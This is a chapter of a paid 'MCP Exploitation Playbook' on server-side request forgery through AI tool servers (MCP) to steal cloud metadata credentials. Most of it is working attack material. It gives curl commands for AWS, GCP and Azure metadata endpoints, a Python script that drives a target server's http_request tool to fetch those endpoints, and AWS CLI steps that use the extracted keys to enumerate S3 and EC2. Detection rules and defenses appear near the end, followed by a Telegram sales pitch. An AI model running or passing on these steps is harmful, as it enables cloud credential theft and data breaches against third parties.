# Chapter 03 — SSRF / Cloud Metadata Extraction
## The 9099 Files — MCP Exploitation Playbook

---

## What It Is

SSRF in MCP means using a tool with network access to reach internal services the attacker cannot reach directly. Most dangerous: cloud metadata endpoints that expose credentials, instance metadata, and IAM tokens.

Every major cloud provider has a metadata service at `169.254.169.254`. If your MCP server runs on AWS/GCP/Azure and has network access, it's likely reachable. If it can reach that endpoint, it can extract credentials for the entire service account.

---

## Why This Works

Cloud providers design metadata services to be accessible only from inside the instance. The instance itself is trusted. If your MCP server runs on an EC2/GCE/Azure VM, it has that trust implicitly. Any tool with HTTP access can query the metadata service and receive credentials.

MCP tools with `http_request`, `fetch`, `browse`, or `curl` capabilities are the attack vector. The attack is not "break into the cloud." It's "trick the MCP server into using its own credentials on your behalf."

---

## The Attack

### Step 1 — Confirm Metadata Reachability

```bash
# AWS metadata
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/user-data/

# GCP metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Azure
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
curl -H "Metadata: true" http://169.254.169.254/metadata/attendedMSI?api-version=2019-08-01
```

If any of these return data, the metadata service is accessible.

### Step 2 — Extract Credentials via MCP Tool

```python
#!/usr/bin/env python3
"""
MCP SSRF — Cloud Metadata Extraction via MCP Tools
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

METADATA_ENDPOINTS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/ami-id",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/attendedMSI?api-version=2019-08-01",
]

def test_via_mcp(target, endpoint):
    """Use MCP tool to fetch metadata endpoint"""
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "http_request",  # Adjust to match target's actual tool name
            "arguments": {"url": endpoint}
        }
    }
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
        return r.json()
    except:
        return {}

def main():
    print(f"[*] MCP SSRF — Cloud Metadata Extraction")
    print(f"[*] Target: {TARGET}\n")
    
    confirmed = []
    for endpoint in METADATA_ENDPOINTS:
        print(f"[*] Testing: {endpoint}")
        result = test_via_mcp(TARGET, endpoint)
        result_str = json.dumps(result)
        
        if "AccessDenied" not in result_str and "error" not in result_str:
            if len(result_str) > 10:
                print(f"    [!] ACCESSIBLE: {endpoint}")
                print(f"    Data: {result_str[:300]}")
                confirmed.append((endpoint, result_str))
    
    if confirmed:
        print(f"\n[!] {len(confirmed)} metadata endpoints accessible via MCP")
        print("[!] Check results for IAM credentials or sensitive instance data")
    else:
        print("[-] No open metadata endpoints via this tool.")

if __name__ == "__main__":
    main()
```

### Step 3 — Parse and Use Credentials

If AWS credentials are returned:

```bash
# Install AWS CLI
pip3 install awscli

# Configure with extracted keys
aws configure --access-key-id ACCESSKEY --secret-access-key SECRETKEY --region us-east-1

# Test access
aws sts get-caller-identity

# If that works, enumerate S3
aws s3 ls

# Enumerate EC2
aws ec2 describe-instances
```

---

## Real Case

**Capital One — classic SSRF leading to RCE and data exfiltration**

The Capital One breach (2019) was SSRF via a WAF misconfiguration. An attacker sent requests that should have been blocked to an internal metadata endpoint, extracted EC2 credentials, and used those to access S3 buckets containing customer data. Over 100 million records.

MCP servers that expose HTTP tools are the same class of vulnerability. If the HTTP tool can reach `169.254.169.254`, the same attack path exists.

---

## Detection Rules

### KQL — Sentinel

```kql
MCP_ToolInputs
| where ToolName has "http" or ToolName has "fetch" or ToolName has "browse"
    and (RequestUrl contains "169.254.169.254"
         or RequestUrl contains "metadata.google.internal"
         or RequestUrl contains "metadata.azure.com"
         or RequestUrl contains "100.100.100.200")
| project TimeGenerated, ToolName, RequestUrl, SourceIP
```

### Sigma

```yaml
title: MCP SSRF — Internal Metadata Access
log_source: mcp_server
detection:
  selection:
    event.type: tool_call
    tool.name|contains: http
    request.url|contains:
      - 169.254.169.254
      - metadata.google.internal
      - metadata.azure.com
  condition: selection
level: critical
```

---

## Defenses

1. **Block metadata IP ranges at the MCP server firewall** — Explicitly deny `169.254.0.0/16` (AWS), `metadata.google.internal` (GCP), and Azure metadata IP at the security group or network ACL level. This should be done even if tools don't explicitly target these IPs — block the range entirely.

2. **IMDSv2 on all cloud instances** — AWS IMDSv2 requires PUT requests for tokens. Most SSRF tools use GET. Enable `aws ec2 modify-instance-metadata-options` with `--http-tokens required`. This alone stops most metadata extraction.

3. **Network-level segmentation** — MCP server should run in a VPC with no internet egress, or egress filtering that blocks internal IP ranges.

4. **No HTTP tool should exist without scope limiting** — If you need HTTP tools, scope them to specific domains. A general-purpose `curl` tool on an MCP server running in a cloud environment is an active SSRF exploit waiting to be found.

5. **Service account key rotation** — Rotate keys regularly so even if extraction happens, window of abuse is limited.

---

**$29 USDT — Full Playbook with 10 Chapters**

TX hash to `@hunnidinnit` on Telegram.